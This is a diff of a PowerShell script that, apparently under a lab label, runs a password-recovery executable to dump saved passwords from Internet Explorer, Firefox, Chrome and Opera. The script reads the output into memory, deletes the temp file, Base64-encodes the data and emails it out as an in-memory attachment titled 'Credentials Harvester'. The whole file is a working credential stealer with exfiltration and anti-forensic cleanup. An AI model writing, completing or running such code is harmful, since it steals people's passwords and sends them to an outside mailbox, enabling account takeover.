@@ -1,4 +1,7 @@
 $global:isEmailSent = $false
+function SetEmailSentTrue {$global:isEmailSent = $true}
+function SetEmailSentFalse {$global:isEmailSent = $false}
+
 
 function Send-ZohoEmail {
     param (
@@ -58,26 +61,43 @@ function Send-ZohoEmail {
     }
 }
 
-# 1. Capture NirSoft output directly into RAM (Standard Output)
-# No file is created on the hard drive
-# Use the environment variable to point to the Temp folder
-$rawData = & "$env:TEMP\example.exe" /sstdout | Out-String
+# 1. Define the executable path
+$exe = "$env:TEMP\example.exe"
 
-# 2. Obfuscate the data using Base64
+# 2. Run the tool with full browser flags
+# We use /stext "" to try and force output to the console, 
+# but if that build is restricted, we use a temporary variable file.
+$tempFile = "$env:TEMP\tmp.txt"
+
+# Execute with all browsers enabled (1 = Yes)
+& $exe /LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /stext $tempFile
+
+# 3. Read the file into RAM and IMMEDIATELY delete the file
+if (Test-Path $tempFile) {
+    $rawData = Get-Content $tempFile | Out-String
+    Remove-Item $tempFile -Force
+}
+
+# # 1. Capture NirSoft output directly into RAM (Standard Output)
+# # No file is created on the hard drive
+# # Use the environment variable to point to the Temp folder
+# $rawData = & "$env:TEMP\example.exe" /sstdout | Out-String
+
+# 4. Obfuscate the data using Base64
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
 $b64String = [System.Convert]::ToBase64String($bytes)
 
-# 3. Create a Memory Stream from the scrambled data
+# 5. Create a Memory Stream from the scrambled data
 $ms = New-Object System.IO.MemoryStream
 $writer = New-Object System.IO.StreamWriter($ms)
 $writer.Write($b64String)
 $writer.Flush()
 $ms.Position = 0
 
-# 4. Create the Email Attachment (exists only in RAM)
+# 6. Create the Email Attachment (exists only in RAM)
 $attachment = New-Object Net.Mail.Attachment($ms, "$env:TEMP\data.txt")
 
-# 5. Send Email via TLS
+# 7. Send Email via TLS
 if (-not $isEmailSent) {
     # Email parameters
     $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
@@ -85,7 +105,7 @@ if (-not $isEmailSent) {
     Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
 }
 
-# 6. Secure Cleanup
+# 8. Secure Cleanup
 $attachment.Dispose()
 $ms.Dispose()
 Write-Host "Lab Task Complete. Memory Purged." -ForegroundColor Green
